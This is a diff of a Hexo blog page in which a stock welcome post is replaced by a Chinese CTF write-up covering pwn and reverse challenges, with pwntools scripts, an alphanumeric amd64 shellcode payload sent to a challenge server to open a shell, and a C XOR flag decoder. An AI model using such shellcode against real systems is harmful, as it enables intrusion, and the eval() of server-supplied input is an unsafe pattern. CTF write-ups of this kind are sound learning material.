@@ -16,21 +16,28 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+    <meta name="description" content="Pwn测测need nc在linux或者kali里面打开命令行面板，直接nc题目给的地址，可以得到flag  计算题罢了因为没有给任何附件，先nc一下，可以发现就是计算加减法，然后回答正确就可以了，通过pwntool和python来编写exp获得后门，解得flag  EXP1234567891011from pwn import *io &#x3D; remote(&quot;20.121.143.21&amp;q">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://example.com/2023/10/19/hello-world/index.html">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2023/11/15/M03C4T(1)/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="Pwn测测need nc在linux或者kali里面打开命令行面板，直接nc题目给的地址，可以得到flag  计算题罢了因为没有给任何附件，先nc一下，可以发现就是计算加减法，然后回答正确就可以了，通过pwntool和python来编写exp获得后门，解得flag  EXP1234567891011from pwn import *io &#x3D; remote(&quot;20.121.143.21&amp;q">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-10-19T08:26:49.264Z">
-<meta property="article:modified_time" content="2023-10-25T14:16:49.576Z">
+<meta property="og:image" content="d:\phpstudy_pro\WWW\wp\pwn_buu\image\2023-11-04-18-13-02-image.png">
+<meta property="og:image" content="d:\phpstudy_pro\WWW\wp\pwn_buu\image\2023-11-04-18-18-49-image.png">
+<meta property="og:image" content="d:\phpstudy_pro\WWW\wp\pwn_buu\image\2023-11-04-18-28-49-image.png">
+<meta property="og:image" content="d:\phpstudy_pro\WWW\wp\pwn_buu\image\2023-11-04-19-23-42-image.png">
+<meta property="og:image" content="d:\phpstudy_pro\WWW\wp\pwn_buu\image\2023-11-04-19-34-43-image.png">
+<meta property="og:image" content="d:\phpstudy_pro\WWW\wp\pwn_buu\image\2023-11-04-19-31-05-image.png">
+<meta property="article:published_time" content="2023-11-15T07:40:32.521Z">
+<meta property="article:modified_time" content="2023-11-04T11:53:54.775Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="d:\phpstudy_pro\WWW\wp\pwn_buu\image\2023-11-04-18-13-02-image.png">
   
   
   
-  <title>Hello World - Hexo</title>
+  <title>Hexo</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -196,7 +203,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Hello World"></span>
+            <span id="subtitle" data-typed-text=""></span>
           
         </div>
 
@@ -207,8 +214,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-10-19 16:26" pubdate>
-          2023年10月19日 下午
+        <time datetime="2023-11-15 15:40" pubdate>
+          2023年11月15日 下午
         </time>
       </span>
     
@@ -219,7 +226,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          367 字
+          1.7k 字
         
       </span>
     
@@ -230,7 +237,7 @@
         
         
         
-          4 分钟
+          14 分钟
         
       </span>
     
@@ -267,24 +274,30 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Hello World</h1>
+            <h1 id="seo-header"></h1>
             
             
               <div class="markdown-body">
                 
-                <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>
+                <h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="测测need-nc"><a href="#测测need-nc" class="headerlink" title="测测need nc"></a>测测need nc</h3><p>在linux或者kali里面打开命令行面板，直接nc题目给的地址，可以得到flag</p>
+<p><img src="D:\phpstudy_pro\WWW\wp\pwn_buu\image\2023-11-04-18-13-02-image.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="计算题罢了"><a href="#计算题罢了" class="headerlink" title="计算题罢了"></a>计算题罢了</h3><p>因为没有给任何附件，先nc一下，可以发现就是计算加减法，然后回答正确就可以了，通过pwntool和python来编写exp获得后门，解得flag</p>
+<p><img src="D:\phpstudy_pro\WWW\wp\pwn_buu\image\2023-11-04-18-18-49-image.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io = remote(<span class="hljs-string">&quot;20.121.143.21&quot;</span>, <span class="hljs-number">10000</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    io.recvuntil(<span class="hljs-string">&quot;-------\n&quot;</span>)<br>    data = io.recv().strip().decode()<br>    expression = data.strip().split(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">0</span>]<br>    result = <span class="hljs-built_in">eval</span>(expression)<br>    io.sendline(<span class="hljs-built_in">str</span>(result))<br>    io.recvline()<br>    <span class="hljs-built_in">print</span>(expression, result)<br>io.interactive()<br></code></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure>
+<p><img src="D:\phpstudy_pro\WWW\wp\pwn_buu\image\2023-11-04-18-28-49-image.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>下载之后先checksec一下看看</p>
+<p><img src="D:\phpstudy_pro\WWW\wp\pwn_buu\image\2023-11-04-19-23-42-image.png" srcset="/img/loading.gif" lazyload></p>
+<p>再放进IDA里面查看一下，可以发现if（s[i]&lt;&#x3D;47||s[i]&gt;122）{}主要是因为这一句我们读出了这个可见字符串地要求，该是属于字母、数字这些范围。</p>
+<p>此处使用 alpha3-master 来将我们的 shellcode 进行可见字符化</p>
+<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io = remote(<span class="hljs-string">&quot;20.121.143.21&quot;</span>, <span class="hljs-number">10003</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>shellcode = <span class="hljs-string">b&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span><br>io.send(shellcode)<br>io.interactive()<br></code></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="很简单的xor"><a href="#很简单的xor" class="headerlink" title="很简单的xor"></a>很简单的xor</h3><p>一样在IDA反汇编一下，可以发现就是v4和v5之间进行异或就可以得到flag，直接跑脚本就好了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_length</span><span class="hljs-params">(<span class="hljs-type">char</span> str[])</span><br>&#123;<br>    <span class="hljs-type">char</span> *p = str;<br>    <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (*p++ != <span class="hljs-string">&#x27;\0&#x27;</span>)<br>    &#123;<br>        count++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> count;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> a[] = &#123;<span class="hljs-number">0x41</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x95</span>&#125;;<br>    <span class="hljs-type">char</span> b[] = &#123;<span class="hljs-number">12</span>, <span class="hljs-number">87</span>, <span class="hljs-number">7</span>, <span class="hljs-number">67</span>, <span class="hljs-number">93</span>, <span class="hljs-number">112</span>, <span class="hljs-number">3</span>, <span class="hljs-number">12</span>, <span class="hljs-number">10</span>, <span class="hljs-number">85</span>, <span class="hljs-number">118</span>, <span class="hljs-number">26</span>, <span class="hljs-number">-80</span>, <span class="hljs-number">84</span>, <span class="hljs-number">62</span>, <span class="hljs-number">-91</span>, <span class="hljs-number">-54</span>, <span class="hljs-number">52</span>, <span class="hljs-number">66</span>, <span class="hljs-number">68</span>, <span class="hljs-number">-24</span>, <span class="hljs-number">91</span>, <span class="hljs-number">103</span>, <span class="hljs-number">41</span>, <span class="hljs-number">-51</span>, <span class="hljs-number">-38</span>, <span class="hljs-number">110</span>, <span class="hljs-number">68</span>, <span class="hljs-number">57</span>, <span class="hljs-number">-24</span>&#125;;<br>    <span class="hljs-type">char</span> c[<span class="hljs-number">30</span>];<br>    <span class="hljs-type">int</span> x, y;<br>    x = get_length(c);<br>    y = get_length(b);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">30</span>; i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, a[i] ^ b[i]);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<p><img src="D:\phpstudy_pro\WWW\wp\pwn_buu\image\2023-11-04-19-34-43-image.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="猜不透，根本猜不透"><a href="#猜不透，根本猜不透" class="headerlink" title="猜不透，根本猜不透"></a>猜不透，根本猜不透</h3><p>直接放进IDA，再f5反汇编就可以看到flag</p>
+<p><img src="D:\phpstudy_pro\WWW\wp\pwn_buu\image\2023-11-04-19-31-05-image.png" srcset="/img/loading.gif" lazyload></p>
 
                 
               </div>
@@ -302,8 +315,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Hello World</div>
-      <div>http://example.com/2023/10/19/hello-world/</div>
+      <div></div>
+      <div>http://example.com/2023/11/15/M03C4T(1)/</div>
     </div>
     <div class="license-meta">
       
@@ -315,7 +328,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年10月19日</div>
+          <div>2023年11月15日</div>
         </div>
       
       
@@ -347,15 +360,15 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/10/25/test/" title="">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile"></span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/2023/10/25/test/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
